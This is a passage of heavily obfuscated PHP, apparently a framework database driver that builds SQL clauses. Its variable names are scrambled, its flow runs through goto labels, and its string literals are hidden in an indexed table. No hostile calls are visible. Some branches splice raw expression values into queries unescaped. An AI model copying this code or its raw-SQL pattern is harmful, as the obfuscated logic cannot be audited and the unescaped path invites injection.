$bìÚó½´ïÖ[874] => think_config($bìÚó½´ïÖ[930]), $bìÚó½´ïÖ[13] => think_config($bìÚó½´ïÖ[936])); } } return $c§·âÕË‡—; } protected function initConnect($CÏ† â¡ŒË = true) { if (1 == think_config($_SERVER[¬ı§†‰ú˜¼][18])) { $this->_linkID = $this->multiConnect($CÏ† â¡ŒË); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $cİîÃ  ’¤ => $D¥Çööéç´) { $this->_linkID = $D¥Çööéç´; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($A‹ˆ¿®ª—î = false) { goto bõöØ£†Ä¯; bõöØ£†Ä¯: $A¾Ì³Œõ˜‰ =& $_SERVER[¬ı§†‰ú˜¼]; static $Eˆø½ï­÷‰ = array(); static $Eõë•¦·ìá = -1; goto CÍ˜Å½ÌÉ; AÃºøĞºò: $F…ÌÁïŒ = array($A¾Ì³Œõ˜‰[847] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[847]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[847]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[847]][0], $A¾Ì³Œõ˜‰[848] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[848]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[848]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[848]][0], $A¾Ì³Œõ˜‰[845] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[845]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[845]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[845]][0], $A¾Ì³Œõ˜‰[846] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[846]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[846]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[846]][0], $A¾Ì³Œõ˜‰[17] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[17]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[17]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[17]][0], $A¾Ì³Œõ˜‰[874] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[874]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[874]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[874]][0], $A¾Ì³Œõ˜‰[13] => isset($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[13]][$FŞÄßä¡·“]) ? $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[13]][$FŞÄßä¡·“] : $Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[13]][0]); return $this->connect($F…ÌÁïŒ, $FŞÄßä¡·“); goto B¨´µ“ƒ§‰; CÍ˜Å½ÌÉ: if (empty($Eˆø½ï­÷‰)) { foreach ($this->config as $A½áÉ£³Á => $fÅê„½„°) { $Eˆø½ï­÷‰[$A½áÉ£³Á] = explode($A¾Ì³Œõ˜‰[47], $fÅê„½„°); } } if (think_config($A¾Ì³Œõ˜‰[937])) { if ($A‹ˆ¿®ª—î) { $FŞÄßä¡·“ = floor(mt_rand(0, think_config($A¾Ì³Œõ˜‰[938]) - 1)); $Eõë•¦·ìá = $FŞÄßä¡·“; } else { if (is_numeric(think_config($A¾Ì³Œõ˜‰[939]))) { $FŞÄßä¡·“ = think_config($A¾Ì³Œõ˜‰[939]); } else { $FŞÄßä¡·“ = floor(mt_rand(think_config($A¾Ì³Œõ˜‰[938]), count($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[845]]) - 1)); } } } else { $FŞÄßä¡·“ = floor(mt_rand(0, count($Eˆø½ï­÷‰[$A¾Ì³Œõ˜‰[845]]) - 1)); $Eõë•¦·ìá = $FŞÄßä¡·“; } $FŞÄßä¡·“ = $Eõë•¦·ìá !== -1 ? $Eõë•¦·ìá : $FŞÄßä¡·“; goto AÃºøĞºò; B¨´µ“ƒ§‰: } public function parseDSN($CÉÙÕ¹„ƒ) { $dßÙ³‹Ô™ç =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($CÉÙÕ¹„ƒ)) { return !1; } $Dœ–š¥“ï = parse_url($CÉÙÕ¹„ƒ); if ($Dœ–š¥“ï[$dßÙ³‹Ô™ç[174]]) { $Cä¦ÌÓçë = array($dßÙ³‹Ô™ç[919] => $Dœ–š¥“ï[$dßÙ³‹Ô™ç[174]], $dßÙ³‹Ô™ç[847] => isset($Dœ–š¥“ï[$dßÙ³‹Ô™ç[561]]) ? $Dœ–š¥“ï[$dßÙ³‹Ô™ç[561]] : $dßÙ³‹Ô™ç[33], $dßÙ³‹Ô™ç[848] => isset($Dœ–š¥“ï[$dßÙ³‹Ô™ç[940]]) ? $Dœ–š¥“ï[$dßÙ³‹Ô™ç[940]] : $dßÙ³‹Ô™ç[33], $dßÙ³‹Ô™ç[845] => isset($Dœ–š¥“ï[$dßÙ³‹Ô™ç[175]]) ? $Dœ–š¥“ï[$dßÙ³‹Ô™ç[175]] : $dßÙ³‹Ô™ç[33], $dßÙ³‹Ô™ç[846] => isset($Dœ–š¥“ï[$dßÙ³‹Ô™ç[176]]) ? $Dœ–š¥“ï[$dßÙ³‹Ô™ç[176]] : $dßÙ³‹Ô™ç[33], $dßÙ³‹Ô™ç[17] => isset($Dœ–š¥“ï[$dßÙ³‹Ô™ç[76]]) ? substr($Dœ–š¥“ï[$dßÙ³‹Ô™ç[76]], 1) : $dßÙ³‹Ô™ç[33]); } else { preg_match($dßÙ³‹Ô™ç[941], trim($CÉÙÕ¹„ƒ), $b…„´ñˆªø); $Cä¦ÌÓçë = array($dßÙ³‹Ô™ç[919] => $b…„´ñˆªø[1], $dßÙ³‹Ô™ç[847] => $b…„´ñˆªø[2], $dßÙ³‹Ô™ç[848] => $b…„´ñˆªø[3], $dßÙ³‹Ô™ç[845] => $b…„´ñˆªø[4], $dßÙ³‹Ô™ç[846] => $b…„´ñˆªø[5], $dßÙ³‹Ô™ç[17] => $b…„´ñˆªø[6]); } $Cä¦ÌÓçë[$dßÙ³‹Ô™ç[874]] = $dßÙ³‹Ô™ç[33]; return $Cä¦ÌÓçë; } protected function debug() { $C·¸æÍñÁ =& $_SERVER[¬ı§†‰ú˜¼]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $C·¸æÍñÁ[942]; if (think_config($C·¸æÍñÁ[943])) { think_status($C·¸æÍñÁ[944]); think_trace($this->queryStr . $C·¸æÍñÁ[945] . think_status($C·¸æÍñÁ[20], $C·¸æÍñÁ[944], 6) . $C·¸æÍñÁ[946], $C·¸æÍñÁ[33], $C·¸æÍñÁ[947]); } } protected function parseLock($D“¯Üß«Â = false) { $fËˆÍ²Åè =& $_SERVER[¬ı§†‰ú˜¼]; if (!$D“¯Üß«Â) { return $fËˆÍ²Åè[33]; } if ($fËˆÍ²Åè[876] == $this->dbType) { return $fËˆÍ²Åè[948]; } return $fËˆÍ²Åè[949]; } protected function parseSet($F­¿×ÌÔÖè) { $D‡Í‰çğŒó =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($F­¿×ÌÔÖè as $cØ¬ÅÍÅ·† => $BŒ´÷”é¼) { if (is_array($BŒ´÷”é¼) && $D‡Í‰çğŒó[294] == $BŒ´÷”é¼[0]) { $aØßéºğ‰[] = $this->parseKey($cØ¬ÅÍÅ·†) . $D‡Í‰çğŒó[950] . $BŒ´÷”é¼[1]; } elseif (is_scalar($BŒ´÷”é¼) || is_null($BŒ´÷”é¼)) { $aØßéºğ‰[] = $this->parseKey($cØ¬ÅÍÅ·†) . $D‡Í‰çğŒó[950] . $this->parseValue($BŒ´÷”é¼); } } return $D‡Í‰çğŒó[951] . implode($D‡Í‰çğŒó[47], $aØßéºğ‰); } protected function bindParam($D›Ïª†¨×, $báÌçîê) { $this->bind[$_SERVER[¬ı§†‰ú˜¼][4] . $D›Ïª†¨×] = $báÌçîê; } protected function parseBind($c¼©“õ´Š) { $c¼©“õ´Š = array_merge($this->bind, $c¼©“õ´Š); $this->bind = array(); return $c¼©“õ´Š; } function parseKey(&$c‘‡Ï‰„‰Ğ, $déáÏ„ùƒœ = true) { if ($déáÏ„ùƒœ) { $c‘‡Ï‰„‰Ğ = $this->parseKeyCheck($c‘‡Ï‰„‰Ğ); } return $c‘‡Ï‰„‰Ğ; } function parseKeyCheck($CÏ»´É‚ê‘) { $DçÏîší—² =& $_SERVER[¬ı§†‰ú˜¼]; $CÏ»´É‚ê‘ = trim($CÏ»´É‚ê‘); if (!preg_match($DçÏîší—²[952], $CÏ»´É‚ê‘)) { think_exception($DçÏîší—²[953] . $CÏ»´É‚ê‘); } return $CÏ»´É‚ê‘; } protected function parseValue($A®¥ß£ÈÛ“) { $FùÑÌöî¨ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_string($A®¥ß£ÈÛ“)) { $A®¥ß£ÈÛ“ = $FùÑÌöî¨[915] . $this->escapeString($A®¥ß£ÈÛ“) . $FùÑÌöî¨[915]; } elseif (isset($A®¥ß£ÈÛ“[0]) && is_string($A®¥ß£ÈÛ“[0]) && strtolower($A®¥ß£ÈÛ“[0]) == $FùÑÌöî¨[294]) { $A®¥ß£ÈÛ“ = $this->escapeString($A®¥ß£ÈÛ“[1]); } elseif (is_array($A®¥ß£ÈÛ“)) { $A®¥ß£ÈÛ“ = array_map(array($this, $FùÑÌöî¨[916]), $A®¥ß£ÈÛ“); } elseif (is_bool($A®¥ß£ÈÛ“)) { $A®¥ß£ÈÛ“ = $A®¥ß£ÈÛ“ ? $FùÑÌöî¨[87] : $FùÑÌöî¨[495]; } elseif (is_null($A®¥ß£ÈÛ“)) { $A®¥ß£ÈÛ“ = $FùÑÌöî¨[103]; } return $A®¥ß£ÈÛ“; } protected function parseField($A†Ù•‰¿Ì) { $A‰Èö¢© =& $_SERVER[¬ı§†‰ú˜¼]; if (is_string($A†Ù•‰¿Ì) && strpos($A†Ù•‰¿Ì, $A‰Èö¢©[47])) { $A†Ù•‰¿Ì = explode($A‰Èö¢©[47], $A†Ù•‰¿Ì); } if (is_array($A†Ù•‰¿Ì)) { $BŠ¶’ô’’œ = array(); foreach ($A†Ù•‰¿Ì as $dˆ÷Àø½Â¡ => $f´©ƒá¯‹½) { if (!is_numeric($dˆ÷Àø½Â¡)) { $BŠ¶’ô’’œ[] = $this->parseKey($dˆ÷Àø½Â¡, !1) . $A‰Èö¢©[954] . $this->parseKey($f´©ƒá¯‹½); } else { $BŠ¶’ô’’œ[] = $this->parseKey($f´©ƒá¯‹½); } } $EŠèêß¨”î = implode($A‰Èö¢©[47], $BŠ¶’ô’’œ); } elseif (is_string($A†Ù•‰¿Ì) && !empty($A†Ù•‰¿Ì)) { $EŠèêß¨”î = $A†Ù•‰¿Ì; } else { $EŠèêß¨”î = $A‰Èö¢©[182]; } return $EŠèêß¨”î; } protected function parseTable($eöÕ×Ù¼ã) { $aá–µÀñ‹¯ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($eöÕ×Ù¼ã)) { $dŠîÅÕê»× = array(); foreach ($eöÕ×Ù¼ã as $EÜ­óæÂŒ… => $aÔƒ¨®æÑ£) { if (!is_numeric($EÜ­óæÂŒ…)) { $dŠîÅÕê»×[] = $this->parseKey($EÜ­óæÂŒ…) . $aá–µÀñ‹¯[50] . $this->parseKey($aÔƒ¨®æÑ£); } else { $dŠîÅÕê»×[] = $this->parseKey($EÜ­óæÂŒ…); } } $eöÕ×Ù¼ã = $dŠîÅÕê»×; } elseif (is_string($eöÕ×Ù¼ã)) { if (strstr($eöÕ×Ù¼ã, $aá–µÀñ‹¯[50])) { return $eöÕ×Ù¼ã; } $eöÕ×Ù¼ã = explode($aá–µÀñ‹¯[47], $eöÕ×Ù¼ã); array_walk($eöÕ×Ù¼ã, array($this, $aá–µÀñ‹¯[865])); } return $aá–µÀñ‹¯[859] . trim(implode($aá–µÀñ‹¯[955], $eöÕ×Ù¼ã), $aá–µÀñ‹¯[381]) . $aá–µÀñ‹¯[859]; } protected function parseWhere($a•óÂ×Ğ¶ß) { $f¡ö‡÷Íçé =& $_SERVER[¬ı§†‰ú˜¼]; $aŞ¨´ëÜÀâ = $f¡ö‡÷Íçé[33]; if (is_string($a•óÂ×Ğ¶ß)) { $aŞ¨´ëÜÀâ = $a•óÂ×Ğ¶ß; } else { $Bæ¯™æ¸Ê = isset($a•óÂ×Ğ¶ß[$f¡ö‡÷Íçé[956]]) ? strtoupper($a•óÂ×Ğ¶ß[$f¡ö‡÷Íçé[956]]) : $f¡ö‡÷Íçé[33]; if (in_array($Bæ¯™æ¸Ê, array($f¡ö‡÷Íçé[957], $f¡ö‡÷Íçé[958], $f¡ö‡÷Íçé[959]))) { $Bæ¯™æ¸Ê = $f¡ö‡÷Íçé[50] . $Bæ¯™æ¸Ê . $f¡ö‡÷Íçé[50]; unset($a•óÂ×Ğ¶ß[$f¡ö‡÷Íçé[956]]); } else { $Bæ¯™æ¸Ê = $f¡ö‡÷Íçé[960]; } foreach ($a•óÂ×Ğ¶ß as $Aƒ†ë¹°Á¥ => $EŞ•ø‰•íâ) { $aŞ¨´ëÜÀâ .= $f¡ö‡÷Íçé[274]; if (is_numeric($Aƒ†ë¹°Á¥)) { $Aƒ†ë¹°Á¥ = $f¡ö‡÷Íçé[961]; } if (0 === strpos($Aƒ†ë¹°Á¥, $f¡ö‡÷Íçé[71])) { $aŞ¨´ëÜÀâ .= $this->parseThinkWhere($Aƒ†ë¹°Á¥, $EŞ•ø‰•íâ); } else { if (!preg_match($f¡ö‡÷Íçé[962], trim($Aƒ†ë¹°Á¥))) { think_exception(think_lang($f¡ö‡÷Íçé[963]) . $f¡ö‡÷Íçé[4] . $Aƒ†ë¹°Á¥); } $fÄÎ‚²ÀÁ = is_array($EŞ•ø‰•íâ) && isset($EŞ•ø‰•íâ[$f¡ö‡÷Íçé[964]]); $Aƒ†ë¹°Á¥ = trim($Aƒ†ë¹°Á¥); if (strpos($Aƒ†ë¹°Á¥, $f¡ö‡÷Íçé[280])) { $BñóÕºË½ = explode($f¡ö‡÷Íçé[280], $Aƒ†ë¹°Á¥); $B‚Ç‡¤Éß = array(); foreach ($BñóÕºË½ as $e£‰„Ù‘¶È => $eÍôƒôÊÖ†) { $Eƒ“Ï›ô›· = $fÄÎ‚²ÀÁ ? $EŞ•ø‰•íâ[$e£‰„Ù‘¶È] : $EŞ•ø‰•íâ; $B‚Ç‡¤Éß[] = $f¡ö‡÷Íçé[257] . $this->parseWhereItem($this->parseKey($eÍôƒôÊÖ†), $Eƒ“Ï›ô›·) . $f¡ö‡÷Íçé[864]; } $aŞ¨´ëÜÀâ .= implode($f¡ö‡÷Íçé[965], $B‚Ç‡¤Éß); } elseif (strpos($Aƒ†ë¹°Á¥, $f¡ö‡÷Íçé[281])) { $BñóÕºË½ = explode($f¡ö‡÷Íçé[281], $Aƒ†ë¹°Á¥); $B‚Ç‡¤Éß = array(); foreach ($BñóÕºË½ as $e£‰„Ù‘¶È => $eÍôƒôÊÖ†) { $Eƒ“Ï›ô›· = $fÄÎ‚²ÀÁ ? $EŞ•ø‰•íâ[$e£‰„Ù‘¶È] : $EŞ•ø‰•íâ; $B‚Ç‡¤Éß[] = $f¡ö‡÷Íçé[257] . $this->parseWhereItem($this->parseKey($eÍôƒôÊÖ†), $Eƒ“Ï›ô›·) . $f¡ö‡÷Íçé[864]; } $aŞ¨´ëÜÀâ .= implode($f¡ö‡÷Íçé[960], $B‚Ç‡¤Éß); } else { $aŞ¨´ëÜÀâ .= $this->parseWhereItem($this->parseKey($Aƒ†ë¹°Á¥), $EŞ•ø‰•íâ); } } $aŞ¨´ëÜÀâ .= $f¡ö‡÷Íçé[275] . $Bæ¯™æ¸Ê; } $aŞ¨´ëÜÀâ = substr($aŞ¨´ëÜÀâ, 0, -strlen($Bæ¯™æ¸Ê)); } return empty($aŞ¨´ëÜÀâ) ? $f¡ö‡÷Íçé[33] : $f¡ö‡÷Íçé[966] . $aŞ¨´ëÜÀâ; } protected function parseWhereItem($a¢ÆÚŠİ¦, $e–ˆ§Ã¾) { $a‚¾ğ‰” =& $_SERVER[¬ı§†‰ú˜¼]; $bå„ñŸ¿–ç = $a‚¾ğ‰”[33]; if (is_array($e–ˆ§Ã¾)) { if (is_string($e–ˆ§Ã¾[0])) { $f­ÇÅ¢»Œ× = strtolower($e–ˆ§Ã¾[0]); if (in_array($e–ˆ§Ã¾[0], array($a‚¾ğ‰”[950], $a‚¾ğ‰”[967], $a‚¾ğ‰”[968], $a‚¾ğ‰”[969], $a‚¾ğ‰”[970], $a‚¾ğ‰”[971]))) { $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $e–ˆ§Ã¾[0] . $a‚¾ğ‰”[50] . $this->parseValue($e–ˆ§Ã¾[1]); } elseif (preg_match($a‚¾ğ‰”[972], $e–ˆ§Ã¾[0])) { $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[50] . $this->parseValue($e–ˆ§Ã¾[1]); } elseif (preg_match($a‚¾ğ‰”[973], $e–ˆ§Ã¾[0])) { if (is_array($e–ˆ§Ã¾[1])) { $c«ŠéãÎÌ¦ = isset($e–ˆ§Ã¾[2]) ? strtoupper($e–ˆ§Ã¾[2]) : $a‚¾ğ‰”[958]; if (in_array($c«ŠéãÎÌ¦, array($a‚¾ğ‰”[957], $a‚¾ğ‰”[958], $a‚¾ğ‰”[959]))) { $C°áÖ»È˜ó = array(); foreach ($e–ˆ§Ã¾[1] as $BÎ¼’ÇÈ…¹) { $C°áÖ»È˜ó[] = $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[50] . $this->parseValue($BÎ¼’ÇÈ…¹); } $bå„ñŸ¿–ç .= $a‚¾ğ‰”[257] . implode($a‚¾ğ‰”[50] . $c«ŠéãÎÌ¦ . $a‚¾ğ‰”[50], $C°áÖ»È˜ó) . $a‚¾ğ‰”[864]; } } else { $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[50] . $this->parseValue($e–ˆ§Ã¾[1]); } } elseif ($a‚¾ğ‰”[294] == $f­ÇÅ¢»Œ×) { $bå„ñŸ¿–ç .= $a‚¾ğ‰”[862] . $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $e–ˆ§Ã¾[1] . $a‚¾ğ‰”[974]; } elseif (preg_match($a‚¾ğ‰”[975], $e–ˆ§Ã¾[0])) { $bå„ñŸ¿–ç .= $e–ˆ§Ã¾[0]; } elseif (preg_match($a‚¾ğ‰”[976], $e–ˆ§Ã¾[0])) { if (isset($e–ˆ§Ã¾[2]) && $a‚¾ğ‰”[294] == $e–ˆ§Ã¾[2]) { $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[50] . $e–ˆ§Ã¾[1]; } else { if (is_string($e–ˆ§Ã¾[1])) { $e–ˆ§Ã¾[1] = explode($a‚¾ğ‰”[47], $e–ˆ§Ã¾[1]); } $CªªƒÀ¢áÜ = implode($a‚¾ğ‰”[47], $this->parseValue($e–ˆ§Ã¾[1])); $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[862] . $CªªƒÀ¢áÜ . $a‚¾ğ‰”[864]; } } elseif (preg_match($a‚¾ğ‰”[977], $e–ˆ§Ã¾[0])) { $DùÙÚ¥éŠÀ = is_string($e–ˆ§Ã¾[1]) ? explode($a‚¾ğ‰”[47], $e–ˆ§Ã¾[1]) : $e–ˆ§Ã¾[1]; $bå„ñŸ¿–ç .= $a‚¾ğ‰”[862] . $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $this->exp[$f­ÇÅ¢»Œ×] . $a‚¾ğ‰”[50] . $this->parseValue($DùÙÚ¥éŠÀ[0]) . $a‚¾ğ‰”[960] . $this->parseValue($DùÙÚ¥éŠÀ[1]) . $a‚¾ğ‰”[275]; } else { think_exception(think_lang($a‚¾ğ‰”[963]) . $a‚¾ğ‰”[4] . $e–ˆ§Ã¾[0]); } } else { $dÓ¢¤Ÿ»®° = count($e–ˆ§Ã¾); $f‰¢•†®Œ§ = $a‚¾ğ‰”[33]; if (is_string($e–ˆ§Ã¾[$dÓ¢¤Ÿ»®° - 1])) { $f‰¢•†®Œ§ = isset($e–ˆ§Ã¾[$dÓ¢¤Ÿ»®° - 1]) ? strtoupper($e–ˆ§Ã¾[$dÓ¢¤Ÿ»®° - 1]) : $a‚¾ğ‰”[33]; if (in_array($f‰¢•†®Œ§, array($a‚¾ğ‰”[957], $a‚¾ğ‰”[958], $a‚¾ğ‰”[959]))) { $dÓ¢¤Ÿ»®° = $dÓ¢¤Ÿ»®° - 1; } } else { $f‰¢•†®Œ§ = $a‚¾ğ‰”[957]; } for ($B ªÁòßË = 0; $B ªÁòßË < $dÓ¢¤Ÿ»®°; $B ªÁòßË++) { $DùÙÚ¥éŠÀ = is_array($e–ˆ§Ã¾[$B ªÁòßË]) ? $e–ˆ§Ã¾[$B ªÁòßË][1] : $e–ˆ§Ã¾[$B ªÁòßË]; if ($a‚¾ğ‰”[294] == strtolower($e–ˆ§Ã¾[$B ªÁòßË][0])) { $bå„ñŸ¿–ç .= $a‚¾ğ‰”[257] . $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $DùÙÚ¥éŠÀ . $a‚¾ğ‰”[974] . $f‰¢•†®Œ§ . $a‚¾ğ‰”[50]; } else { $f¡“²ßšÌ° = is_array($e–ˆ§Ã¾[$B ªÁòßË]) ? $this->exp[strtolower($e–ˆ§Ã¾[$B ªÁòßË][0])] : $a‚¾ğ‰”[950]; if (!$f¡“²ßšÌ° && is_array($e–ˆ§Ã¾[$B ªÁòßË]) && in_array($e–ˆ§Ã¾[$B ªÁòßË][0], array($a‚¾ğ‰”[950], $a‚¾ğ‰”[967], $a‚¾ğ‰”[968], $a‚¾ğ‰”[969], $a‚¾ğ‰”[970], $a‚¾ğ‰”[971]))) { $f¡“²ßšÌ° = $e–ˆ§Ã¾[$B ªÁòßË][0]; } $bå„ñŸ¿–ç .= $a‚¾ğ‰”[257] . $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[50] . $f¡“²ßšÌ° . $a‚¾ğ‰”[50] . $this->parseValue($DùÙÚ¥éŠÀ) . $a‚¾ğ‰”[974] . $f‰¢•†®Œ§ . $a‚¾ğ‰”[50]; } } $bå„ñŸ¿–ç = substr($bå„ñŸ¿–ç, 0, -4); } } else { $bå„ñŸ¿–ç .= $a¢ÆÚŠİ¦ . $a‚¾ğ‰”[978] . $this->parseValue($e–ˆ§Ã¾); } return $bå„ñŸ¿–ç; } protected function parseThinkWhere($C˜õ»‘éÙ, $AßÏç˜ ù‹) { $b‰Şì¢ä¼“ =& $_SERVER[¬ı§†‰ú˜¼]; $d³¢ù¸ÃÒ© = $b‰Şì¢ä¼“[33]; switch ($C˜õ»‘éÙ) { case $b‰Şì¢ä¼“[349]: $d³¢ù¸ÃÒ© = $AßÏç˜ ù‹; break; case $b‰Şì¢ä¼“[961]: $d³¢ù¸ÃÒ© = is_string($AßÏç˜ ù‹) ? $AßÏç˜ ù‹ : substr($this->parseWhere($AßÏç˜ ù‹), 6); break; case $b‰Şì¢ä¼“[979]: parse_str($AßÏç˜ ù‹, $CŒ÷¢¶Ï); if (isset($CŒ÷¢¶Ï[$b‰Şì¢ä¼“[956]])) { $B™Ø§ôˆš = $b‰Şì¢ä¼“[50] . strtoupper($CŒ÷¢¶Ï[$b‰Şì¢ä¼“[956]]) . $b‰Şì¢ä¼“[50]; unset($CŒ÷¢¶Ï[$b‰Şì¢ä¼“[956]]); } else { $B™Ø§ôˆš = $b‰Şì¢ä¼“[960]; } $A¨ƒ­§œïï = array(); foreach ($CŒ÷¢¶Ï as $dÂØÔôí¯¡ => $e¢õ¨‘—¶é) { $A¨ƒ­§œïï[] = $this->parseKey($dÂØÔôí¯¡) . $b‰Şì¢ä¼“[978] . $this->parseValue($e¢õ¨‘—¶é); } $d³¢ù¸ÃÒ© = implode($B™Ø§ôˆš, $A¨ƒ­§œïï); break; } return $d³¢ù¸ÃÒ©; } protected function parseLimit($FÈŒÕ±—ñš) { $AçØî’ŒÛ =& $_SERVER[¬ı§†‰ú˜¼]; return !empty($FÈŒÕ±—ñš) ? $AçØî’ŒÛ[48] . $FÈŒÕ±—ñš . $AçØî’ŒÛ[50] : $AçØî’ŒÛ[33]; } protected function parseJoin($DÕàŠ§‰š) { $F‡Ä˜£ß†Ú =& $_SERVER[¬ı§†‰ú˜¼]; $Fî±ÂÜÖ«î = $F‡Ä˜£ß†Ú[33]; if (!empty($DÕàŠ§‰š)) { if (is_array($DÕàŠ§‰š)) { foreach ($DÕàŠ§‰š as $A†‘ùù°Í² => $B´›©”Ë­) { if (!1 !== stripos($B´›©”Ë­, $F‡Ä˜£ß†Ú[980])) { $Fî±ÂÜÖ«î .= $F‡Ä˜£ß†Ú[50] . $B´›©”Ë­; } else { $Fî±ÂÜÖ«î .= $F‡Ä˜£ß†Ú[981] . $B´›©”Ë­; } } } else { $Fî±ÂÜÖ«î .= $F‡Ä˜£ß†Ú[981] . $DÕàŠ§‰š; } } $Fî±ÂÜÖ«î = preg_replace($F‡Ä˜£ß†Ú[982], think_config($F‡Ä˜£ß†Ú[888]) . $F‡Ä˜£ß†Ú[983], $Fî±ÂÜÖ«î); return $Fî±ÂÜÖ«î; } protected function parseOrder($E™Æ¹ê‹‘) { $F£ìğŞ’Â­ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($E™Æ¹ê‹‘)) { $eñÈ¨å¸‘¥ = array(); foreach ($E™Æ¹ê‹‘ as $AŸ‘¸µŞË— => $D»Ö½ß¿Ü—) { if (is_numeric($AŸ‘¸µŞË—)) { $eñÈ¨å¸‘¥[] = $this->parseKey($D»Ö½ß¿Ü—); } else { $D»Ö½ß¿Ü— = in_array(strtoupper(trim($D»Ö½ß¿Ü—)), array($F£ìğŞ’Â­[984], $F£ìğŞ’Â­[985])) ? $F£ìğŞ’Â­[50] . $D»Ö½ß¿Ü— : $F£ìğŞ’Â­[33]; if (preg_match($F£ìğŞ’Â­[986], $AŸ‘¸µŞË—)) { $eñÈ¨å¸‘¥[] = $this->parseKey($AŸ‘¸µŞË—) . $D»Ö½ß¿Ü—; } else { think_exception($F£ìğŞ’Â­[987] . $AŸ‘¸µŞË—); } } } $E™Æ¹ê‹‘ = implode($F£ìğŞ’Â­[47], $eñÈ¨å¸‘¥); } return !empty($E™Æ¹ê‹‘) ? $F£ìğŞ’Â­[988] . $E™Æ¹ê‹‘ : $F£ìğŞ’Â­[33]; } protected function parseGroup($C«Ç‹µíæÖ) { $e¢‹¡Ûè‡Á =& $_SERVER[¬ı§†‰ú˜¼]; return !empty($C«Ç‹µíæÖ) ? $e¢‹¡Ûè‡Á[989] . $C«Ç‹µíæÖ : $e¢‹¡Ûè‡Á[33]; } protected function parseHaving($C×øŠ™³¾Ç) { $E¬‘®Õ†óô =& $_SERVER[¬ı§†‰ú˜¼]; return !empty($C×øŠ™³¾Ç) ? $E¬‘®Õ†óô[990] . $C×øŠ™³¾Ç : $E¬‘®Õ†óô[33]; } protected function parseComment($a¼ì¡åô) { $c²Ç«¼ôÒ =& $_SERVER[¬ı§†‰ú˜¼]; return !empty($a¼ì¡åô) ? $c²Ç«¼ôÒ[991] . $a¼ì¡åô . $c²Ç«¼ôÒ[992] : $c²Ç«¼ôÒ[33]; } protected function parseDistinct($E¼åÖøô ù) { $Cƒ‡ÀÆÉ¸Û =& $_SERVER[¬ı§†‰ú˜¼]; return !empty($E¼åÖøô ù) ? $Cƒ‡ÀÆÉ¸Û[993] : $Cƒ‡ÀÆÉ¸Û[33]; } protected function parseUnion($BÃ•”ŠÕØù) { $f‚îÄ‹¾øò =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($BÃ•”ŠÕØù)) { return $f‚îÄ‹¾øò[33]; } if (isset($BÃ•”ŠÕØù[$f‚îÄ‹¾øò[345]])) { $bóìè±‡ó‘ = $f‚îÄ‹¾øò[994]; unset($BÃ•”ŠÕØù[$f‚îÄ‹¾øò[345]]); } else { $bóìè±‡ó‘ = $f‚îÄ‹¾øò[995]; } foreach ($BÃ•”ŠÕØù as $E‰ÈÕÎ†Í·) { $Cì…¡”íÇ‰[] = $bóìè±‡ó‘ . (is_array($E‰ÈÕÎ†Í·) ? $this->buildSelectSql($E‰ÈÕÎ†Í·) : $E‰ÈÕÎ†Í·); } return implode($f‚îÄ‹¾øò[50], $Cì…¡”íÇ‰); } public function insert($AÍŞÙ÷§‚…, $Cğ´¼Ú‹´“ = array(), $eğ›³ÂéË‹ = false) { goto EÓòŒÙŠ²ª; B 